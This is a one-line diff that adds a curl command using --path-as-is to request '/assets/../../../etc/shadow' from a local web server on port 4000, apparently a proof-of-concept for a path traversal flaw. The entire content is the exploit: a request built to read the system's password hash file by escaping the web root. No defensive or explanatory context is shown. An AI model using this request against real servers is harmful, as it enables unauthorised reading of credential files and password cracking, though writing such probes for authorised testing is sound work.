@@ -1,0 +1,1 @@
+curl -s --path-as-is "http://localhost:4000/assets/../../../etc/shadow"
